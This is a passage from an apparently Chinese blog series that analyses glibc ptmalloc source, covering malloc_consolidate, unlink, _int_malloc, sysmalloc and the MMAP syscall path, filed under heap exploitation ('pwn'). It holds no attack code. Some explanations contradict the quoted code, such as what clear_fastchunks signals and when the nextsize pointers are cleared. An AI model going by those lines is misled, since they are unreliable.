FASTCHUNKS_BIT;</div><div class="line"></div><div class="line">    av-&gt;top = initial_top (av);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数做了四件事情，第一是初始化<code>malloc_state</code>中的<code>bins</code>数组，初始化的结果是对<code>bins</code>数组中的每一个<code>fd</code>和对应的<code>bk</code>，都初始化为<code>fd</code>的地址，即<code>fd=bk=&amp;fd</code>；第二是设置fastbin可管理的内存块的最大值，即<code>global_max_fast</code>，<code>DEFAULT_MXFAST</code>定义为，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</div></pre></td></tr></table></figure>
<p>本章假设为64，<code>set_max_fast</code>定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define set_max_fast(s) \</div><div class="line">  global_max_fast = (((s) == 0)                           \</div><div class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</div></pre></td></tr></table></figure>
<p>第三是设置一些标志位；第四是初始化分配去中的top chunk，就是一个<code>malloc_chunk</code>指针，<code>fd</code>保存在<code>bins[0]</code>中（smallbin中不使用<code>bins[0]</code>和<code>bins[1]</code>）。<br>重新回到<code>_int_malloc</code>中，假设<code>victim</code>不为0，下面就从双向链表中取出<code>victim</code>，设置其中的标志位，然后返回用户可分配的内存指针。<br>假设smallbin中没有空闲chunk可用，下面就要开始寻找largebin了，<code>largebin_index</code>定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define largebin_index(sz) \</div><div class="line">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</div><div class="line">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</div><div class="line">   : largebin_index_32 (sz))</div></pre></td></tr></table></figure>
<p>根据前面<code>SIZE_SZ</code>的假设，这里<code>largebin_index</code>对应的就是<code>largebin_index_32</code>，定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#define largebin_index_32(sz)                                                \</div><div class="line">  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;&gt; 6) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\</div><div class="line">   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\</div><div class="line">   126)</div></pre></td></tr></table></figure>
<p>这里就不多解释了，如果需要知道sz和索引的对应关系，可以自己计算一下。<br>再接下来<code>have_fastchunks</code>根据标志位判断fastbin中是否有空闲chunk，如果有，就调用<code>malloc_consolidate</code>将这些chunk和并，然后加入到unsortedbin中。</p>
<h1 id="int-malloc-—-合并fastbin"><a href="#int-malloc-—-合并fastbin" class="headerlink" title="_int_malloc — 合并fastbin"></a>_int_malloc — 合并fastbin</h1><p>下面重新看一下<code>malloc_consolidate</code>函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">static void malloc_consolidate(mstate av) &#123;</div><div class="line">    mfastbinptr* fb;</div><div class="line">    mfastbinptr* maxfb;</div><div class="line">    mchunkptr p;</div><div class="line">    mchunkptr nextp;</div><div class="line">    mchunkptr unsorted_bin;</div><div class="line">    mchunkptr first_unsorted;</div><div class="line"></div><div class="line">    mchunkptr nextchunk;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line">    INTERNAL_SIZE_T nextsize;</div><div class="line">    INTERNAL_SIZE_T prevsize;</div><div class="line">    int nextinuse;</div><div class="line">    mchunkptr bck;</div><div class="line">    mchunkptr fwd;</div><div class="line"></div><div class="line">    if (get_max_fast () != 0) &#123;</div><div class="line">        clear_fastchunks(av);</div><div class="line">        unsorted_bin = unsorted_chunks(av);</div><div class="line"></div><div class="line">        maxfb = &amp;fastbin(av, NFASTBINS - 1);</div><div class="line">        fb = &amp;fastbin(av, 0);</div><div class="line">        do &#123;</div><div class="line">            p = atomic_exchange_acq(fb, 0);</div><div class="line">            if (p != 0) &#123;</div><div class="line">                do &#123;</div><div class="line">                    check_inuse_chunk(av, p);</div><div class="line">                    nextp = p-&gt;fd;</div><div class="line"></div><div class="line">                    size = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);</div><div class="line">                    nextchunk = chunk_at_offset(p, size);</div><div class="line">                    nextsize = chunksize(nextchunk);</div><div class="line"></div><div class="line">                    if (!prev_inuse(p)) &#123;</div><div class="line">                        prevsize = p-&gt;prev_size;</div><div class="line">                        size += prevsize;</div><div class="line">                        p = chunk_at_offset(p, -((long ) prevsize));</div><div class="line">                        unlink(av, p, bck, fwd);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    if (nextchunk != av-&gt;top) &#123;</div><div class="line">                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</div><div class="line"></div><div class="line">                        if (!nextinuse) &#123;</div><div class="line">                            size += nextsize;</div><div class="line">                            unlink(av, nextchunk, bck, fwd);</div><div class="line">                        &#125; else</div><div class="line">                            clear_inuse_bit_at_offset(nextchunk, 0);</div><div class="line"></div><div class="line">                        first_unsorted = unsorted_bin-&gt;fd;</div><div class="line">                        unsorted_bin-&gt;fd = p;</div><div class="line">                        first_unsorted-&gt;bk = p;</div><div class="line"></div><div class="line">                        if (!in_smallbin_range(size)) &#123;</div><div class="line">                            p-&gt;fd_nextsize = NULL;</div><div class="line">                            p-&gt;bk_nextsize = NULL;</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        set_head(p, size | PREV_INUSE);</div><div class="line">                        p-&gt;bk = unsorted_bin;</div><div class="line">                        p-&gt;fd = first_unsorted;</div><div class="line">                        set_foot(p, size);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    else &#123;</div><div class="line">                        size += nextsize;</div><div class="line">                        set_head(p, size | PREV_INUSE);</div><div class="line">                        av-&gt;top = p;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125; while ((p = nextp) != 0);</div><div class="line"></div><div class="line">            &#125;</div><div class="line">        &#125; while (fb++ != maxfb);</div><div class="line">    &#125; else &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因为ptmalloc前面已经初始化过了，这里直接进入if内部，首先通过<code>clear_fastchunks</code>设置标志位表示fastbin中存在空闲chunk，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</div></pre></td></tr></table></figure>
<p>然后通过<code>unsorted_chunks</code>获得bins数组中unsortedbin对应的<code>malloc_chunk</code>指针（其<code>fd</code>和<code>bk</code>指针对应<code>bins[0]</code>和<code>bins[1]</code>）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define unsorted_chunks(M)          (bin_at (M, 1))</div></pre></td></tr></table></figure>
<p>再往下，将fastbin中的最大和最小的chunk对应的<code>malloc_chunk</code>指针赋值给<code>maxfb</code>和<code>fb</code>，然后通过do，while循环遍历fastbin中的每个chunk链表，<code>atomic_exchange_acq</code>又是一个CAS操作，该函数取出<code>fb</code>指针，并将原来的chunk链表头指针的值设为0，表示chunk链表空闲了。然后开始进入内层的循环，这里遍历的是每个chunk链表中的每个<code>malloc_chunk</code>指针。<br>接下来首先去除chunk中的<code>PREV_INUSE</code>和<code>NON_MAIN_ARENA</code>标志，为了获得chunk的大小（size中的最低三位被用来作为标志位，并且fastbin中chunk的标志位<code>IS_MMAPPED</code>默认为0）。然后通过<code>chunk_at_offset</code>和<code>chunksize</code>获得下一个chunk以及其大小，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</div><div class="line">#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</div><div class="line">#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</div></pre></td></tr></table></figure>
<p>再往下，如果chunk的前一个chunk没在使用中，就合并该chunk与前一个chunk，主要是重新计算<code>malloc_chunk</code>的指针，并调用<code>unlink</code>将前一个chunk从bins数组中删除，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</div><div class="line">    FD = P-&gt;fd;                                   \</div><div class="line">    BK = P-&gt;bk;                                   \</div><div class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))             \</div><div class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</div><div class="line">    else &#123;                                    \</div><div class="line">        FD-&gt;bk = BK;                                  \</div><div class="line">        BK-&gt;fd = FD;                                  \</div><div class="line">        if (!in_smallbin_range (P-&gt;size)                      \</div><div class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;            \</div><div class="line">        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \</div><div class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</div><div class="line">          malloc_printerr (check_action,                      \</div><div class="line">                   &quot;corrupted double-linked list (not small)&quot;,    \</div><div class="line">                   P, AV);                        \</div><div class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;                    \</div><div class="line">                if (P-&gt;fd_nextsize == P)                      \</div><div class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             \</div><div class="line">                else &#123;                                \</div><div class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \</div><div class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \</div><div class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 \</div><div class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 \</div><div class="line">                  &#125;                               \</div><div class="line">              &#125; else &#123;                                \</div><div class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             \</div><div class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             \</div><div class="line">              &#125;                                   \</div><div class="line">          &#125;                                   \</div><div class="line">      &#125;                                       \</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>简单来说，该宏定义就是将前一个chunk从两个双线链表中删除，<code>fd</code>和<code>bk</code>指针构成的双向链表存在于smallbin和largebin中，<code>fd_nextsize</code>和<code>bk_nextsize</code>指针构成的双向链表只存在于largebin中。<br>再往下，如果相邻的下一个chunk不是top chunk，并且下一个chunk不在使用中，就继续合并，否则，就清除下一个chunk的<code>PREV_INUSE</code>，表示该chunk已经空闲了。<br>然后将刚刚合并完的chunk添加进<code>unsorted_bin</code>中，<code>unsorted_bin</code>也是一个双向链表。<br>如果合并完的chunk属于smallbin的大小，则需要清除<code>fd_nextsize</code>和<code>bk_nextsize</code>，因为smallbin中的chunk不会使用这两个指针。并且通过<code>setHead</code>保证不会有相邻的两个chunk都空闲，并且通过<code>setFoot</code>设置下一个chunk的<code>prev_size</code>。<br>如果相邻的下一个chunk是top chunk，则将合并完的chunk继续合并到top chunk中。<br>至此，<code>malloc_consolidate</code>就分析完了，总结一下，<code>malloc_consolidate</code>就是遍历fastbin中每个chunk链表的每个<code>malloc_chunk</code>指针，合并前一个不在使用中的chunk，如果后一个chunk是top chunk，则直接合并到top chunk中，如果后一个chunk不是top chunk，则合并后一个chunk并添加进<code>unsorted_bin</code>中。</p>
<p>下一章继续往下分析_int_malloc函数。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[malloc源码分析——2]]></title>
      <url>/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/</url>
      <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>根据上一章的分析，malloc会调用<code>__libc_malloc</code>分配内存，<code>__libc_malloc</code>会调用<code>malloc_hook_ini</code> 进行初始化，然后回调<code>__libc_malloc</code>函数，这时候会执行<code>_int_malloc</code>开始分配内存，定义在malloc.c中，因为非常长，这里分段来看，</p>
<h2 id="int-malloc第一部分"><a href="#int-malloc第一部分" class="headerlink" title="_int_malloc第一部分"></a>_int_malloc第一部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line">    INTERNAL_SIZE_T nb;</div><div class="line">    unsigned int idx;</div><div class="line">    mbinptr bin;</div><div class="line"></div><div class="line">    mchunkptr victim;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line">    int victim_index;</div><div class="line"></div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    unsigned int block;</div><div class="line">    unsigned int bit;</div><div class="line">    unsigned int map;</div><div class="line"></div><div class="line">    mchunkptr fwd;</div><div class="line">    mchunkptr bck;</div><div class="line"></div><div class="line">    const char *errstr = NULL;</div><div class="line"></div><div class="line">    checked_request2size(bytes, nb);</div><div class="line"></div><div class="line">    if (__glibc_unlikely(av == NULL)) &#123;</div><div class="line">        void *p = sysmalloc(nb, av);</div><div class="line">        if (p != NULL)</div><div class="line">            alloc_perturb(p, bytes);</div><div class="line">        return p;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>首先调用<code>checked_request2size</code>将需要分配的内存大小bytes转换为chunk的大小。<code>checked_request2size</code>是个宏定义，主要调用request2size进行计算，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define request2size(req)                                         \</div><div class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</div><div class="line">   MINSIZE :                                                      \</div><div class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</div></pre></td></tr></table></figure>
<p>为了说明request2size，首先看一下ptmalloc中关于chunk的定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">struct malloc_chunk &#123;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T prev_size;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line"></div><div class="line">    struct malloc_chunk* fd; </div><div class="line">    struct malloc_chunk* bk;</div><div class="line"></div><div class="line">    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</div><div class="line">    struct malloc_chunk* bk_nextsize;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>当一个chunk为空闲时，至少要有<code>prev_size</code>、<code>size</code>、<code>fd</code>和<code>bk</code>四个参数，因此MINSIZE就代表了这四个参数需要占用的内存大小；而当一个chunk被使用时，<code>prev_size</code>可能会被前一个chunk用来存储，<code>fd</code>和<code>bk</code>也会被当作内存存储数据，因此当chunk被使用时，只剩下了<code>size</code>参数需要设置，<code>request2size</code>中的<code>SIZE_SZ</code>就是<code>INTERNAL_SIZE_T</code>类型的大小，因此至少需要<code>req+SIZE_SZ</code>的内存大小。<code>MALLOC_ALIGN_MASK</code>用来对齐，因此request2size就计算出了所需的chunk的大小。</p>
<p>传入的参数av是在上一章<code>__libc_malloc</code>中调用<code>arena_get</code>获得的分配去指针，如果为null，就表示没有分配区可用，这时候就直接调用<code>sysmalloc</code>通过mmap获取chunk。</p>
<h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><p><code>sysmalloc</code>的代码很长，但只有前面一小部分是这里需要分析的，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line">    mchunkptr old_top;</div><div class="line">    INTERNAL_SIZE_T old_size;</div><div class="line">    char *old_end;</div><div class="line"></div><div class="line">    long size;</div><div class="line">    char *brk;</div><div class="line"></div><div class="line">    long correction;</div><div class="line">    char *snd_brk;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T front_misalign;</div><div class="line">    INTERNAL_SIZE_T end_misalign;</div><div class="line">    char *aligned_brk;</div><div class="line"></div><div class="line">    mchunkptr p;</div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    bool tried_mmap = false;</div><div class="line"></div><div class="line">    if (av == NULL</div><div class="line">            || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)</div><div class="line">                    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;</div><div class="line">        char *mm;</div><div class="line"></div><div class="line">        try_mmap:</div><div class="line">        if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)</div><div class="line">            size = ALIGN_UP(nb + SIZE_SZ, pagesize);</div><div class="line">        else</div><div class="line">            size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</div><div class="line">        tried_mmap = true;</div><div class="line"></div><div class="line">        if ((unsigned long) (size) &gt; (unsigned long) (nb)) &#123;</div><div class="line">            mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0));</div><div class="line"></div><div class="line">            if (mm != MAP_FAILED) &#123;</div><div class="line"></div><div class="line">                if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) &#123;</div><div class="line">                    assert(</div><div class="line">                            ((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == 0);</div><div class="line">                    front_misalign = 0;</div><div class="line">                &#125; else</div><div class="line">                    front_misalign = (INTERNAL_SIZE_T) chunk2mem(</div><div class="line">                            mm) &amp; MALLOC_ALIGN_MASK;</div><div class="line">                if (front_misalign &gt; 0) &#123;</div><div class="line">                    correction = MALLOC_ALIGNMENT - front_misalign;</div><div class="line">                    p = (mchunkptr) (mm + correction);</div><div class="line">                    p-&gt;prev_size = correction;</div><div class="line">                    set_head(p, (size - correction) | IS_MMAPPED);</div><div class="line">                &#125; else &#123;</div><div class="line">                    p = (mchunkptr) mm;</div><div class="line">                    set_head(p, size | IS_MMAPPED);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                int new = atomic_exchange_and_add(&amp;mp_.n_mmaps, 1) + 1;</div><div class="line">                atomic_max(&amp;mp_.max_n_mmaps, new);</div><div class="line"></div><div class="line">                unsigned long sum;</div><div class="line">                sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;</div><div class="line">                atomic_max(&amp;mp_.max_mmapped_mem, sum);</div><div class="line"></div><div class="line">                check_chunk (av, p);</div><div class="line"></div><div class="line">                return chunk2mem(p);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (av == NULL)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>首先，可以直接通过mmap分配chunk有两个前提条件，一是需要分配的内存大小大于实用mmap进行分配的阀值<code>mp_.mmap_threshold</code>，二是通过<code>mp_.n_mmaps</code>判断系统还可以有可以使用mmap分配的空间。<br>下面就要计算需要分配多少内存，在前面已经通过<code>request2size</code>计算了需要分配的内存大小，这里为什么还要计算呢？这是因为通过使用mmap直接分配的chunk不需要添加到链表中，因此不存在前后关系，当一个chunk被使用时，不能借用后一个chunk的<code>prev_size</code>字段，这里需要把该字段的长度SIZE_SZ加上。并且这里假设<code>MALLOC_ALIGNMENT == 2 * SIZE_SZ</code>。<br>接下来判断需要分配的内存大小是否会溢出，然后就调用<code>MMAP</code>分配内存，<code>MMAP</code>是一个宏定义，最后就是通过系统调用来分配内存，后面来看这个函数。<br>再往下就是通过<code>set_head</code>在chunk中的size参数里设置标志位，因为chunk是按8字节对齐的，而size标识chunk占用的字节数，所以最后三位是没有用的，ptmalloc将这三位用来作为标志位，这里便是设置其中一个标志位，用来标识该chunk是直接通过mmap分配的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define set_head(p, s)       ((p)-&gt;size = (s))</div></pre></td></tr></table></figure>
<p>设置完标志位后，接下来就是设置全局变量<code>_mp</code>，将<code>mp_.n_mmaps</code>加1，表示当前进程通过mmap分配的chunk个数，对应的<code>mp_.max_n_mmaps</code>表示最大chunk个数。<code>mp_.mmapped_mem</code>标识已经通过mmap分配的内存大小，<code>mp_.max_mmapped_mem</code>对应可分配内存的最大值。其中，<code>atomic_exchange_and_add</code>b表示原子加，<code>atomic_max</code>则是原子取最大值。<br>最后，通过chunk2mem返回chunk中内存的起始指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</div></pre></td></tr></table></figure>
<p>这里也可以知道，当chunk被使用时，用户是从结构体中的变量fd开始使用内存的。回到_int_malloc函数中，假设通过sysmalloc分配成功，接下来就需要调用alloc_perturb对刚刚分配的内存进行初始化，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">static void alloc_perturb(char *p, size_t n) &#123;</div><div class="line">    if (__glibc_unlikely(perturb_byte))</div><div class="line">        memset(p, perturb_byte ^ 0xff, n);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>刚函数没有什么实际意义，所以不管它。</p>
<h2 id="MMAP"><a href="#MMAP" class="headerlink" title="MMAP"></a>MMAP</h2><p>为了方便分析，这里贴一段调用MMAP的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0));</div></pre></td></tr></table></figure>
<p>MMAP在glibc中为宏定义，其定义很长，这里简单将它改写，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#define INTERNAL_SYSCALL_MAIN_6(name, err, arg1, arg2, arg3,        \</div><div class="line">                arg4, arg5, arg6)           \</div><div class="line">  struct libc_do_syscall_args _xv =                 \</div><div class="line">    &#123;                                   \</div><div class="line">      (int) (0),                            \</div><div class="line">      (int) (-1),                           \</div><div class="line">      (int) (0)                         \</div><div class="line">    &#125;;                                  \</div><div class="line">    asm volatile (                          \</div><div class="line">    &quot;movl %1, %%eax\n\t&quot;                        \</div><div class="line">    &quot;call __libc_do_syscall&quot;                        \</div><div class="line">    : &quot;=a&quot; (resultvar)                          \</div><div class="line">    : &quot;i&quot; (__NR_mmap2), &quot;c&quot; (size), &quot;d&quot; (PROT_READ | PROT_WRITE), &quot;S&quot; (MAP_ANONYMOUS|MAP_PRIVATE), &quot;D&quot; (&amp;_xv) \</div><div class="line">    : &quot;memory&quot;, &quot;cc&quot;)</div></pre></td></tr></table></figure>
<p><code>__libc_do_syscall</code>是一段汇编代码，最后就是系统调用啦，这里就进入了linux内核中的代码，在arch/x86/entry/syscalls/syscall_32.tbl中有如下定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192 i386    mmap2           sys_mmap_pgoff</div></pre></td></tr></table></figure>
<p>因此，MMAP最后调用linux内核中的<code>sys_mmap_pgoff</code>函数，定义在mm/mmap.c中，</p>
